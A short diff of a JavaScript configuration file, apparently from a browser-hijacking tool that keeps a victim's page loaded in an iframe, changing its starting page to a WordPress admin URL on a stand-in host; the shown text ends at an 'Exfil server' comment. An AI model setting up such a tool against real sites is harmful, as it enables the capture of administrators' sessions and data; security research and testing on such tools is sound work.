@@ -29,7 +29,7 @@ function initGlobals()
 	// load the page the user was on in the iframe
 	// when they reloaded the page. Otherwise,
 	// they'll start here
-	window.taperstartingPage = "https://some.app.com";
+	window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
 
 
 	// Exfil server
